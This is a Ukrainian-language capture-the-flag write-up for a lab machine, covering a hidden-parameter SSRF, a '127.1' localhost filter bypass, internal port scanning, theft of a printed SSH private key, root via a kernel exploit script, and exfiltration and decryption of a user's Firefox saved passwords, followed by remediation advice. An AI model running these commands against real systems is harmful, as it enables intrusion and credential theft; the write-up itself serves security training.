
# The London Bridge - The London Bridge is falling down.

Складність: Medium

Ціль: 10.114.150.99

## 1. Розвідка (Reconnaissance & Enumeration)

### 1.1. Сканування портів (Nmap):
   Первинне сканування мережі за допомогою `nmap` виявило два відкритих порти: SSH (22) та HTTP (8080).
```bash
└─$ sudo nmap -sC -sV -p- -vv -oN nmap_result.txt 10.114.150.99
```

![nmap](./img/nmap.png)

### 1.2. Веб-розвідка:
   Запускаємо фазинг директорій за допомогою `feroxbuster`:
```bash
└─$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u http://10.114.150.99:8080/ -k -t 100 --scan-dir-listings
```

![feroxbuster](./img/feroxbuster.png)

   Аналіз вихідного коду сторінки `/gallery` залишив цікаву підказку від розробників:
```bash
└─$ curl http://10.114.150.99:8080/gallery
...
    <!--To devs: Make sure that people can also add images using links-->
...
```

   Перевірка ендпоінту `/dejaview` показала наявність форми перегляду зображень за URL:
```bash
└─$ curl http://10.114.150.99:8080/dejaview
...                                                                                                                                                                      
<form action="/view_image" method="post">
    <label for="image_url">Enter Image URL:</label><br>
    <input type="text" id="image_url" name="image_url" required><br><br>
    <input type="submit" value="View Image">
</form>
...
```

   Параметр `image_url` не демонстрував ознак server-side обробки URL. Значення лише поверталось у HTML як атрибут `src`, тому HTTP-запит виконував браузер клієнта.
```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \ 
-d "image_url=test.txt"
...
    <img src="test.txt" alt="User provided image">
...

└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "image_url=/upload/04.jpg"
...
    <img src="/upload/04.jpg" alt="User provided image">
...
```

```bash
└─$ echo test > test.txt
└─$ python3 -m http.server 80                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "image_url=http://192.168.130.250/test.txt"
```

## 2. Виявлення SSRF та обхід фільтрації

  Оскільки параметр `image_url` не виконував серверних запитів, виникла гіпотеза про наявність застарілих або прихованих параметрів.

### 2.1. Fuzzing POST-параметрів
   За допомогою `ffuf` шукаємо приховані параметри:
```bash
└─$ ffuf \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "FUZZ=/upload/04.jpg" \
-fs 823
```

![ffuf_www.png](./img/ffuf_www.png)

   Знайдено прихований параметр `www`. Перевірка через локальний HTTP-сервер підтвердила наявність SSRF:
```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \ 
-d "www=http://192.168.130.250/test.txt"
test
```

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.114.150.99 - - [23/Jul/2026 12:37:16] "GET /test.txt HTTP/1.1" 200 -
```

### 2.2. Обхід Localhost Filter
   Спроба звернутися безпосередньо до `127.0.0.1` повернула `403 Forbidden`:
```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.0.0.1"               
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```

   Використовуємо [список обходу фільтрації `localhost`](https://highon.coffee/blog/ssrf-cheat-sheet/), який був модифікований під порт 8080 (на якому працює веб-додаток), за допомогою `ffuf`:
```bash
─$ ffuf \
-w localhost8080_bypass.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://FUZZ" \
-fw 27
```

![ffuf_localhost_bypass.png](./img/ffuf_localhost_bypass.png)

   Запис `http://127.1` успішно обходить фільтр і повертає вміст внутрішньої сторінки. Адреса `127.1` є скороченим представленням `127.0.0.1`, яке резолвиться на `loopback` інтерфейс.
```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \ 
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://127.1"
<HTML>
<body bgcolor="gray">
<h1>London brigde</h1>
<img height=400px width=600px src ="static/1.webp"><br>
<font type="monotype corsiva" size=18>London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair lady<br>
    Build it up with iron bars<br>
    Iron bars, iron bars<br>
    Build it up with iron bars<br>
    My fair lady<br>
    Iron bars will bend and break<br>
    Bend and break, bend and break<br>
    Iron bars will bend and break<br>
    My fair lady<br>
<img height=400px width=600px src="static/2.webp"><br>
<font type="monotype corsiva" size=18>Build it up with gold and silver<br>
    Gold and silver, gold and silver<br>
    Build it up with gold and silver<br>
    My fair lady<br>
    Gold and silver we've not got<br>
    We've not got, we've not got<br>
    Gold and silver we've not got<br>
    My fair lady<br>
<img height=400px width=600px src="static/3.jpg"><br>
    London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair lady<br>
    London Bridge is falling down<br>
    Falling down, falling down<br>
    London Bridge is falling down<br>
    My fair beth</font>
</body>
</HTML>
```

## 3. Отримання первинного доступу (Foothold)

### 3.1. Сканування внутрішніх портів через SSRF
   За допомогою `ffuf` скануємо локальні порти. Це дозволило виявити сервіс, який не був доступний напряму з мережі атакуючого:
```bash
└─$ seq 1 65535 > ports.txt
└─$ ffuf \
-w ports.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://127.1:FUZZ" \
-fs 290
```

![fuff_ports](./img/ffuf_ports.png)

   Результат:
* 8080 — Зовнішній додаток (Explore London).
* 80 — Внутрішній HTTP-сервіс, доступний тільки через SSRF.
  

### 3.2. Сканування директорій на внутрішньому порту 80
   Оскільки внутрішній порт 80 доступний тільки через SSRF, директорії скануються також через нього:
```bash
└─$ ffuf \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://127.1:80/FUZZ" \
-fs 469,1270
```

![ffuf_port80.png](./img/ffuf_port80.png)

   Перевіряємо знайдені директорії.
```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://127.1:80/templates/"
...
    <h1>London Gallery</h1>
    <div class="container">
        {% for filename in filenames %}
            <img class="image" src="{{ url_for('download_file', filename=filename) }}" alt="{{ filename }}">
        {% endfor %}
    </div>
    <h5>Visited London recently? Contribute to the gallery</h5>
    <form method="POST" action="/upload" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    <!--To devs: Make sure that people can also add images using links-->
</body>
</html>
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/uploads/"
...
<h1>Directory listing for /uploads/</h1>
<hr>
<ul>
<li><a href="04.jpg">04.jpg</a></li>
<li><a href="caption.jpg">caption.jpg</a></li>
<li><a href="e3.jpg">e3.jpg</a></li>
<li><a href="images.jpeg">images.jpeg</a></li>
<li><a href="Thames.jpg">Thames.jpg</a></li>
<li><a href="Untitled.png">Untitled.png</a></li>
<li><a href="www.usnews.jpeg">www.usnews.jpeg</a></li>
...
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/static/"
...
<title>Directory listing for /static/</title>
</head>
<body>
<h1>Directory listing for /static/</h1>
<hr>
<ul>
<li><a href="1.webp">1.webp</a></li>
<li><a href="2.webp">2.webp</a></li>
<li><a href="3.jpg">3.jpg</a></li>
...
```

   Повторно перевіряємо з іншим словником. 
```bash
└─$ ffuf \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://127.1:80/FUZZ" \
-fs 469
```

![ffuf_port80_raft](./img/ffuf_port80_raft.png)

   Серед виявлених директорій знаходиться `/.ssh/`:   
```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/.ssh/"  
...
<h1>Directory listing for /.ssh/</h1>
<hr>
<ul>
<li><a href="authorized_keys">authorized_keys</a></li>
<li><a href="id_rsa">id_rsa</a></li>
...
```

  Отримуємо публічний SSH-ключ із `authorized_keys` та відповідний приватний ключ `id_rsa` користувача `beth`: 
```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/.ssh/authorized_keys"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.1:80/.ssh/id_rsa"         
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
a1s5eus3ghTWjcfONROAkEg7O3XsNwgp93UUB8wbU+ADpZnFLPUDErFKoSp+dxG4
rxwqpAp6maqsE4dIZHdAq+Yt6/2HOERKrFWiONQpd6ZA8a325oWXY8UaREvKTuXc
jlL56t4iWQzsRQbBvB+ETg2ma01u/HmW3M9SyroPypcEOqvPnuPpqXHZu7BwALM5
NHhXCNmt+0EOBYKvejsDA6NeZfJgw65NVK+2hQIDAQABAoIBACJyZUaoBLegvMjg
2S32IZUcrr4qJrlCeOCUQDQp196tzlughf/rAwH9qpv9hXW+uYVhJZR/gxPPdm6W
Dlta1mIeuBLuHy9PDMDOAO0E0G9RIJha7iP5cJAJ2RvD6Gx/H7NTfQz64tQa39W4
hng0O9KbxoJleVWeONIiFZOaXiJthuro/d9GSivMBJyT8PR3JG6G+R4Qq1tAJqEU
Hx5DY/U7qVYQ1TE3EfbDR5y0+972fW7J0oZxOuwK6IWP9TtHcPPVIGweaIgZFys3
3ZFEzON5qRhNdV8lc127cUX5R5hFjn14GHJLpvbjkt8D9DggUKKNR8zPJfIGO5Tp
gdzclmECgYEA+kaVi0hq1sYSdZL4wHxDQJfGooPn8Hae8zFrsYjrVD8nOQ9NEz4N
XKqlGMhPc8P0PvuoKy1341ty966S8J+dKfdPzRURFzB84wy3A6CDnViRpCYwKFo0
Aa5wwpWZalBBpEis0h3YKCKVKyhs4/uN6lMw5H3GaCMdqqm00l9DRm0CgYEA1Bqq
e2pPYVCwyQb20/8aP305wu6Bdp+i3dUqkHndhPXmEL8EnXbEJuBymn7aKQ3Ln/zX
8G/7Mze845g93KAPFLeeNk/AmzXKnWB8mgcrFzxAD/wAxH1J9otLvhmX7BRVE6X/
0he6g1mdtNMXbt0B/aMOS+dCsMW1C/7oUfbxAXkCgYAlCvVvXBSUHVT2Gf6/XqUF
lnFL9IIL0ULNc+8go8dQ/NftVhpuUqzfnlI5TMyVsdcgy1akrWIlQI/PoQMWokk8
wOIK1Kdm60JQyLz9yHAyhb1osk5GarNv3EXMRyAh4CcXDbqmjsxDhHrXnHAhfkYO
/Kkr6IHJQAlQDTY6POdUMQKBgQCPPkMMfkuFyVzbJtzjZ1Futz+fKjw8xKrVbfUF
BYhZF0h83sRbI65tIv/C3xCu0SZHshaTxsy7VlU2z8ZXjbEhqLAstce6CqX/iv4b
d+PeGU6afPJ3wLWGz6Qjil1Tjpe2YVFXrbbEpm0fhcA5mwCRLuGk2VXs1Fjk9Q4o
7MDu4QKBgFIomwhD+jmr3Vc2HutYkl3zliSD239sH3k118sTHbedvKH5Q7nw0C+U
a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
-----END RSA PRIVATE KEY-----
```

   Зберігаємо приватний ключ локально, виставляємо права `chmod 600 id_rsa` та підключаємося по SSH:
```bash
└─$ ssh -i id_rsa beth@10.114.150.99
```

![ssh](./img/ssh.png)

   Прапорець користувача знаходиться у нетиповому місці:
```bash
beth@london:~$ find / -name "user.txt" 2>/dev/null
/home/beth/__pycache__/user.txt
```

![user_txt](./img/user.txt)

## 4. Підвищення привілеїв (Privilege Escalation)

   Завантажуємо та запускаємо `linpeas`. 

![linpeas_cve.png](./img/linpeas_cve.png)


   Хоча `linpeas` виявив декілька потенційних вразливостей ядра, було обрано Copy Fail (CVE-2026-31431) через найкращу відповідність конфігурації системи:
* `linpeas` безпосередньо вказав на вразливість системи.
* Не потрібно додатково збирати чи налаштовувати модулі ядра.
* Версія ядра `4.15.0-112-generic` повністю підпадає під діапазон уразливих версій.

   Запускаємо експлойт та забираємо root.txt:
```bash
beth@london:~$ python3 CVE-2026-31431-CopyFail-3.10-.py
# id
uid=0(root) gid=1000(beth) groups=1000(beth)
# 
```

   Незважаючи на збережену первинну групу користувача beth, `UID=0` підтверджує отримання root-привілеїв.
   
![root.txt](./img/root_txt.png)

 
## 5. Отримання додаткових облікових даних (Firefox Decrypt)

   Перевіряємо домашні директорії інших користувачів. У `/home/charles` знаходимо каталог `.mozilla`, де зберігаються дані профілю Firefox.
```bash
root@london:/home/charles# ls -lah
total 24K
drw------- 3 charles charles 4.0K Apr 23  2024 .
drwxr-xr-x 4 root    root    4.0K Mar 10  2024 ..
lrwxrwxrwx 1 root    root       9 Apr 23  2024 .bash_history -> /dev/null
-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
-rw------- 1 charles charles 3.7K Mar 10  2024 .bashrc
drw------- 3 charles charles 4.0K Mar 16  2024 .mozilla
-rw------- 1 charles charles  807 Mar 10  2024 .profile
```

   Пакуємо директорію та піднімаємо тимчасовий HTTP-сервер для завантаження:
```bash
root@london:/home/charles# tar -cvf mozilla.tgz  .mozilla/
root@london:/home/charles# python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
192.168.130.250 - - [23/Jul/2026 05:40:32] "GET /mozilla.tgz HTTP/1.1" 200 -
```

   Завантажуємо архів та за допомогою `firefox_decrypt` витягуємо збережені паролі користувача `charles`:
```bash
└─$ wget http://10.114.150.99:81/mozilla.tgz
└─$ sudo tar -xvf mozilla.tgz
└─$ sudo chmod -R 777 .mozilla
└─$ python3 firefox_decrypt.py .mozilla/firefox/8k3bf3zp.charles
```

![firefox_decrypt.png](./img/firefox_decrypt.png)

## Висновки та рекомендації (Remediation)

* **SSRF Mitigation:** Впровадити сувору валідацію вхідних URL-адрес за допомогою білих списків (whitelisting). Заблокувати можливість виконання запитів до приватних/петльових діапазонів IP-адрес (`127.0.0.0/8`, `10.0.0.0/8`, `192.168.0.0/16`).
* **Code Hygiene:** Видалити застарілі або тестові параметри (`www`) перед релізом у продакшн.
* **Principle of Least Privilege:** Не зберігати приватні ключі SSH у відкритих веб-директоріях. Сервіси повинні працювати з мінімально необхідними правами доступу.
* **Patch Management:** Своєчасно оновлювати ядро операційної системи (Ubuntu Linux) для запобігання експлуатації відомих вразливостей (CVE).
